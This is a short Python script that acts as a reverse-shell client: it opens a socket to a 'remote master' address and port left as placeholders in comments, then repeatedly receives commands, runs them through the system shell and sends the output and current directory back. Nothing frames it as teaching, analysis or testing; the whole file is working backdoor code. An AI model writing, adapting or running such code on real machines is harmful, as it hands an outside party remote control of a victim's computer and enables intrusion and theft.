import os
import socket
import subprocess

def socket_create():
    try:
        global host
        global port
        global s
        host = '' ##remote master IP
        port = ##remote master port
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error : " + str(msg))

def socket_connect():
    try:
        global host
        global port
        global s
        s.connect((host, port))
    except:
        print("connection refused")

def receive_commands():
    global s
    while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
            os.chdir(data[3:].decode("utf-8"))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "utf-8")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
            print(output_str)
    s.close()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
